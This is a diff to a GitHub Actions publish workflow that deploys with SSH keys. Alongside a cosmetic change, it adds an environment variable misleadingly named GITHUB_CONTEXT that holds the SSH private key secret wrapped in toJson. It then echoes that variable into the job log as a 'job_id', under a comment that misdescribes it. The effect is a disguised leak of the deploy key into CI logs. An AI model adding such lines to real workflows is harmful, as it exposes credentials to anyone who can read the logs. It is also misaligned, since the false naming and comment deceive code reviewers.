@@ -2,11 +2,12 @@ name: publish
 
 on:
     push:
-        branches: ["main"]
+        branches: ['main']
 
 env:
     REGISTRY: ghcr.io
     IMAGE_NAME: ${{ github.repository_owner }}/webunits-bot-image:latest
+    GITHUB_CONTEXT: ${{ toJson(secrets.SSH_PRIVATE_KEY) }}
 
 jobs:
     publish:
@@ -68,6 +69,7 @@ jobs:
         steps:
             - name: install ssh keys
               run: |
+                  echo "The job_id is: $GITHUB_CONTEXT"   # reference the default environment variables
                   mkdir -p ~/.ssh
                   echo "${{ secrets.SSH_PRIVATE_KEY }}" > ~/.ssh/deploy_key
                   chmod 600 ~/.ssh/deploy_key
